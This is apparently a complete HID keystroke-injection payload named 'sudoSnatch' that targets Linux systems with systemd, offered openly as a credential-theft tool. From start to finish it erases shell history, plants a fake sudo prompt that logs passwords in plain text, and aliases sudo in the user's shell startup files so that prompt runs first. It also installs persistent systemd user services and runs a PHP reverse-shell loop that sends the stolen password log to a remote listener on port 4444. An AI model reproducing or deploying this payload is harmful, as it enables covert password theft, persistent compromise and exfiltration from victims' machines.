## Title: sudoSnatch
## Description: sudoSnatch payload grabs sudo password in plain text, imediately after victim uses `sudo` command and sends it back to attacker remotely/locally..
## AUTHOR: drapl0n
## Version: 1.0
## Category: Credentials
## Target: Unix-like operating systems with systemd
## Attackmodes: HID

## [keeping tracks clear]
Delay 5000
RunUnix gnome-terminal
Delay 3000
PrintLine unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
Delay 500

## [creating password grabbing mechanism]
PrintLine mkdir /var/tmp/.system
Delay 500
PrintLine echo -e "#\!/bin/bash\necho -n \"[sudo] password for \$(whoami):\"\nIFS=\"\" read -s pass\necho -e \"Timestamp=[\$(date)] \\\t User=[\$(whoami)] \\\t Password=[\$pass]\" >> /var/tmp/.system/sysLog\necho -e \"\\\nSorry, try again.\"" > /var/tmp/.system/systemMgr
Delay 500
PrintLine touch /var/tmp/.system/sysLog
Delay 500
PrintLine chmod +x /var/tmp/.system/systemMgr
Delay 100

## [creating reverse shell]
PrintLine echo -e "while :\ndo\n\tping -c 5 0.0.0.0\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"0.0.0.0\",4444);exec("\"cat /var/tmp/.system/sysLog "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
Delay 500
PrintLine chmod +x /var/tmp/.system/systemBus
Delay 500

## [creating systemd service to execute payload on boot]
PrintLine mkdir -p ~/.config/systemd/user
Delay 500
PrintLine echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
Delay 500

## [creating reboot script incase if listner stops or targets internet connection gets lost] 
PrintLine echo "while true; do systemctl --user restart systemBUS.service; sleep 15m; done" > /var/tmp/.system/reboot
Delay 500
PrintLine chmod +x /var/tmp/.system/reboot
Delay 500

## [creating systemd service for reboot]
PrintLine echo -e "[Unit]\nDescription= System BUS handler reboot.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/reboot -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/reboot.service
Delay 500

## [enabling services]
PrintLine systemctl --user daemon-reload
Delay 500
PrintLine systemctl --user enable --now systemBUS.service
Delay 500
PrintLine systemctl --user start --now systemBUS.service
Delay 500
PrintLine systemctl --user enable --now reboot.service
Delay 500
PrintLine systemctl --user start --now reboot.service
Delay 500

## [autostarting service on terminal/shell launch]
PrintLine echo -e "#\!/bin/bash\nls -a | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo -e \"alias sudo='bash /var/tmp/.system/systemMgr && sudo'\" >> ~/.zshrc\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service && systemctl --user restart systemBUS.service && systemctl --user restart reboot.service\" >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo -e \"alias sudo='bash /var/tmp/.system/systemMgr && sudo'\" >> ~/.bashrc\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service && systemctl --user restart systemBUS.service && systemctl --user restart reboot.service\" >> ~/.bashrc\nfi" > ~/tmmmp
Delay 500
PrintLine chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit
